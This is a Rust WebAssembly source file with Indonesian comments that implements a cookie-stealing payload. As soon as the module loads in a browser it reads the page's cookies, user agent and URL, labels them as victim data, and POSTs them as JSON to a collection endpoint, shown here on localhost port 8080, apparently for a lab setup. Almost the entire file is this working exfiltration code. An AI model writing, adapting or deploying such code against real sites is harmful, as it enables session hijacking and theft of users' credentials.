use wasm_bindgen::prelude::*;
use wasm_bindgen::JsCast; // PENTING: Untuk mengubah Document -> HtmlDocument
use wasm_bindgen_futures::spawn_local;
use web_sys::{HtmlDocument, Request, RequestInit, RequestMode, Response};

#[wasm_bindgen(start)]
pub fn start() -> Result<(), JsValue> {
    // 1. Dapatkan Window
    let window = web_sys::window().expect("No global `window` exists");

    // 2. Dapatkan Document, lalu paksa ubah jadi HtmlDocument (Casting)
    // Tanpa ini, kita tidak bisa akses .cookie()
    let document = window.document().expect("Should have a document on window");
    let html_document = document
        .dyn_into::<HtmlDocument>()
        .expect("Document is not an HTML Document");

    // 3. Ambil data sensitif
    let cookies = html_document
        .cookie()
        .unwrap_or_else(|_| "No Cookies".into());
    let user_agent = window.navigator().user_agent().unwrap();
    let location = html_document.location().unwrap().href().unwrap();

    let payload = format!(
        "{{\"victim_url\": \"{}\", \"cookies\": \"{}\", \"browser\": \"{}\"}}",
        location, cookies, user_agent
    );

    // 4. Kirim Data
    spawn_local(async move {
        let _ = send_beacon("http://127.0.0.1:8080/collect", &payload).await;
    });

    Ok(())
}

async fn send_beacon(url: &str, data: &str) -> Result<JsValue, JsValue> {
    let opts = RequestInit::new();

    // PERBAIKAN WARNING: Pakai set_... bukan langsung method()
    opts.set_method("POST");
    opts.set_mode(RequestMode::Cors);
    opts.set_body(&JsValue::from_str(data));

    let request = Request::new_with_str_and_init(url, &opts)?;
    let window = web_sys::window().unwrap();

    let resp_value =
        wasm_bindgen_futures::JsFuture::from(window.fetch_with_request(&request)).await?;
    let _resp: Response = resp_value.dyn_into().unwrap();

    Ok(JsValue::from_str("Sent"))
}
